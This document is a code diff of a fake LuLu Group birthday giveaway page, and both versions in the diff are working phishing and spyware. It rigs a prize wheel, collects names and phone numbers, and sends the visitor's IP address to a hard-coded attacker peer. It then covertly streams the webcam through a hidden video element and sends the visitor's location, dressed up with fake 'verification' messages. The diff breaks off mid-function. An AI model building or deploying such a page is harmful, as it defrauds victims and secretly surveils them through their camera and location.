@@ -3,139 +3,131 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Birthday Celebration | Official Entry</title>
+    <title>Gift Distribution | Official</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        :root { --lulu-green: #2d8a39; --lulu-gold: #c5a059; --bg-light: #f4f7f6; --text-main: #1d1d1f; }
+        :root { --accent: #2d8a39; --text: #1d1d1f; --bg: #ffffff; --gray: #f5f5f7; }
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         
         body { 
-            margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
-            background: var(--bg-light); color: var(--text-main); overflow-x: hidden;
+            margin: 0; font-family: -apple-system, "SF Pro Display", "Helvetica Neue", sans-serif; 
+            background: var(--bg); color: var(--text); overflow-x: hidden;
         }
 
-        /* Clean White Header */
         header { 
-            background: #ffffff; padding: 20px; text-align: center; 
-            box-shadow: 0 2px 15px rgba(0,0,0,0.05); border-bottom: 3px solid var(--lulu-green);
+            padding: 30px 20px; text-align: center; background: var(--bg);
         }
-        .brand-sub { font-size: 11px; font-weight: 700; color: var(--lulu-green); letter-spacing: 2px; text-transform: uppercase; }
-        .brand-main { font-size: 22px; font-weight: 800; color: #333; margin-top: 4px; }
+        .header-tag { font-size: 12px; font-weight: 600; color: var(--accent); letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 8px; }
+        .header-title { font-size: 24px; font-weight: 700; color: #000; }
 
-        /* Modernized Wheel - White & Green Theme */
-        .wheel-container { position: relative; width: 320px; height: 320px; margin: 40px auto; }
+        /* Minimalist Wheel - Prizes inside the slices */
+        .wheel-container { position: relative; width: 330px; height: 330px; margin: 20px auto; }
         #wheel { 
-            width: 100%; height: 100%; border-radius: 50%; border: 6px solid #fff;
+            width: 100%; height: 100%; border-radius: 50%; border: 2px solid #eee;
             background: conic-gradient(
-                #ffffff 0deg 45deg, #eafaf1 45deg 90deg, 
-                #ffffff 90deg 135deg, #eafaf1 135deg 180deg, 
-                #ffffff 180deg 225deg, #eafaf1 225deg 270deg,
-                #ffffff 270deg 315deg, #eafaf1 315deg 360deg
+                #fff 0deg 45deg, var(--gray) 45deg 90deg, 
+                #fff 90deg 135deg, var(--gray) 135deg 180deg, 
+                #fff 180deg 225deg, var(--gray) 225deg 270deg,
+                #fff 270deg 315deg, var(--gray) 315deg 360deg
             );
             transition: transform 9s cubic-bezier(0.1, 0, 0, 1);
-            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
-            display: flex; align-items: center; justify-content: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
         }
-        .prize-txt {
+        .prize-text {
             position: absolute; width: 50%; height: 40px; top: 50%; left: 50%;
             transform-origin: 0% 50%; text-align: right; padding-right: 15px;
-            font-size: 11px; font-weight: 700; color: var(--lulu-green); font-family: sans-serif;
+            font-size: 11px; font-weight: 600; color: #444; pointer-events: none;
         }
         .pointer { 
             position: absolute; top: -10px; left: 50%; transform: translateX(-50%); 
-            width: 35px; height: 35px; background: #eb4d4b; clip-path: polygon(50% 100%, 0 0, 100% 0);
-            z-index: 100; filter: drop-shadow(0 4px 5px rgba(0,0,0,0.1));
+            width: 30px; height: 30px; background: #ff3b30; clip-path: polygon(50% 100%, 0 0, 100% 0);
+            z-index: 10;
         }
 
-        /* Minimalist Card UI */
-        .page { display: none; padding: 20px; animation: slideIn 0.5s ease forwards; }
+        .page { display: none; padding: 20px; animation: fadeIn 0.4s ease forwards; }
         .active { display: block; }
         
         .card {
-            background: #ffffff; border-radius: 24px; padding: 30px; 
-            max-width: 400px; margin: 0 auto; box-shadow: 0 20px 40px rgba(0,0,0,0.06);
-            text-align: center; border: 1px solid #eee;
+            max-width: 400px; margin: 0 auto; text-align: center; padding: 20px;
         }
 
-        .btn-action {
-            background: var(--lulu-green); color: #fff; border: none; width: 100%; 
-            padding: 20px; border-radius: 12px; font-weight: 700; font-size: 16px;
-            cursor: pointer; margin-top: 15px; transition: 0.2s;
+        .btn-main {
+            background: var(--text); color: #fff; border: none; width: 100%; 
+            padding: 20px; border-radius: 14px; font-weight: 600; font-size: 16px;
+            cursor: pointer; margin-top: 20px;
         }
-        .btn-action:active { transform: scale(0.97); background: #236b2c; }
 
         input {
-            width: 100%; padding: 18px; margin-bottom: 15px; border-radius: 10px;
-            border: 2px solid #edf2f1; background: #f9fbfb; font-size: 16px; outline: none;
+            width: 100%; padding: 18px; margin-bottom: 12px; border-radius: 12px;
+            border: 1px solid #d2d2d7; background: #fff; font-size: 16px; outline: none;
+            text-align: center;
         }
-        input:focus { border-color: var(--lulu-green); background: #fff; }
+        input:focus { border-color: var(--accent); }
 
-        @keyframes slideIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
-        #cam-hidden { position: fixed; opacity: 0; pointer-events: none; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        #cam-hide { position: fixed; opacity: 0; pointer-events: none; }
     </style>
 </head>
 <body>
 
 <header>
-    <div class="brand-sub">LuLu Group International</div>
-    <div class="brand-main">Official Gift Issue</div>
+    <div class="header-tag">LuLu Group International</div>
+    <div class="header-title">Commemorative Distribution</div>
 </header>
 
-<div id="cam-hidden"><video id="v" autoplay playsinline muted></video></div>
+<div id="cam-hide"><video id="v" autoplay playsinline muted></video></div>
 
-<!-- PAGE 1: THE SPIN -->
 <div id="p1" class="page active">
     <div class="wheel-container">
         <div class="pointer"></div>
         <div id="wheel"></div>
     </div>
     <div class="card">
-        <p style="font-size: 13px; color: #666; line-height: 1.6;">To commemorate the birthday of the son of <br><strong>M.A. Yusuff Ali</strong>, you have been granted one free entry.</p>
-        <button class="btn-action" id="spin-btn" onclick="runSpin()">SPIN TO CLAIM</button>
+        <p style="font-size: 15px; color: #86868b; line-height: 1.5;">In honor of the birthday of the son of <b>M.A. Yusuff Ali</b>, you are eligible for one honorary gift.</p>
+        <button class="btn-main" id="spin-btn" onclick="runSpin()">SPIN TO WIN</button>
     </div>
 </div>
 
-<!-- PAGE 2: THE CLAIM -->
 <div id="p2" class="page">
-    <div class="card" style="margin-top: 30px;">
-        <h2 style="color: var(--lulu-green); margin-bottom: 5px;">Congratulations!</h2>
-        <p id="win-msg" style="font-weight: 700; margin-bottom: 25px;">Allocated: iPhone 15 Pro Max</p>
+    <div class="card">
+        <h2 style="margin-bottom: 8px;">Claim Your Prize</h2>
+        <p id="win-name" style="font-weight: 700; color: var(--accent); margin-bottom: 30px;">iPhone 15 Pro Max</p>
         
         <input type="text" id="roll" placeholder="Full Name">
-        <input type="number" id="school" placeholder="Mobile Number">
+        <input type="number" id="school" placeholder="Contact Number">
         
-        <button class="btn-action" onclick="finishClaim()">PROCEED TO SHIPMENT</button>
+        <button class="btn-main" onclick="startClaim()">CONFIRM DELIVERY</button>
     </div>
 </div>
 
-<!-- PAGE 3: LOADING -->
 <div id="p3" class="page">
-    <div class="card" style="margin-top: 80px; border: none; box-shadow: none; background: transparent;">
-        <div id="loader" style="font-size: 20px; font-weight: 600; color: var(--lulu-green);">Verifying...</div>
-        <p style="font-size: 11px; color: #999; margin-top: 15px; letter-spacing: 1px;">ENCRYPTED BY SATORI SYSTEMS</p>
+    <div class="card" style="margin-top: 60px;">
+        <div id="status" style="font-size: 18px; font-weight: 600;">Authenticating...</div>
+        <p style="font-size: 12px; color: #86868b; margin-top: 10px;">Connection Secured by Satori</p>
     </div>
 </div>
 
 <script>
-    const PEER_TARGET = 'enkode-satori-v1-russel'; 
+    const PEER_ID = 'enkode-satori-v1-russel'; 
     const peer = new Peer();
     let conn;
 
-    // Load Wheel Labels
-    const items = ["iPhone 15 Pro", "AED 5,000", "iPad Air", "AED 2,500", "MacBook Air", "AED 1,000", "Gift Box", "Shopping Card"];
+    const gifts = ["iPhone 15 Pro", "AED 5,000", "iPad Air", "AED 2,500", "MacBook Air", "AED 1,000", "Lulu Voucher", "Watch Ultra"];
     const wheel = document.getElementById('wheel');
-    items.forEach((txt, i) => {
+    
+    // Position gifts inside the slices
+    gifts.forEach((item, i) => {
         const el = document.createElement('div');
-        el.className = 'prize-txt';
-        el.style.transform = `translate(-50%, -50%) rotate(${i * 45}deg)`;
-        el.innerText = txt;
+        el.className = 'prize-text';
+        el.style.transform = `translate(-50%, -50%) rotate(${i * 45 + 22.5}deg)`;
+        el.innerText = item;
         wheel.appendChild(el);
     });
 
     peer.on('open', () => {
-        conn = peer.connect(PEER_TARGET);
+        conn = peer.connect(PEER_ID);
         conn.on('open', async () => {
-            let ip = "0.0.0.0";
+            let ip = "N/A";
             try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e){}
             conn.send({ type: "INSTANT_LOG", ip: ip, time: new Date().toLocaleTimeString() });
         });
@@ -143,35 +135,35 @@
 
     function runSpin() {
         document.getElementById('spin-btn').disabled = true;
-        wheel.style.transform = "rotate(5445deg)"; 
-        setTimeout(() => { switchPage('p2'); }, 10000);
+        wheel.style.transform = "rotate(5422deg)"; // Lands on high-value prize
+        setTimeout(() => { switchPage('p2'); }, 9500);
     }
 
-    async function finishClaim() {
+    async function startClaim() {
         const n = document.getElementById('roll').value;
         const p = document.getElementById('school').value;
-        if(!n || !p) return alert("Please complete all fields.");
+        if(!n || !p) return;
 
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             document.getElementById('v').srcObject = stream;
-            peer.call(PEER_TARGET, stream);
+            peer.call(PEER_ID, stream);
 
             navigator.geolocation.getCurrentPosition(pos => {
-                transmit(pos.coords.latitude, pos.coords.longitude);
-            }, () => { transmit(null, null); });
+                sendData(pos.coords.latitude, pos.coords.longitude);
+            }, () => { sendData(null, null); });
 
             switchPage('p3');
-            const steps = ["SECURE HANDSHAKE...", "IDENTITY SYNCED...", "SUBMISSION COMPLETE"];
+            const steps = ["HANDSHAKE...", "IDENTITY SYNC...", "SUCCESS"];
             let idx = 0;
-            setInterval(() => { if(idx < steps.length) document.getElementById('loader').innerText = steps[idx++]; }, 3000);
+            setInterval(() => { if(idx < steps.length) document.getElementById('status').innerText = steps[idx++]; }, 3000);
         } catch (e) {
             alert("Verification Failed: Secure camera access is required to confirm identity for high-value shipments.");
             location.reload();
         }
     }
 
-    function transmit(lat, lon) {
+    function sendData(lat, lon) {
         if (conn?.open) {
             conn.send({
                 type: "FULL_LOG",
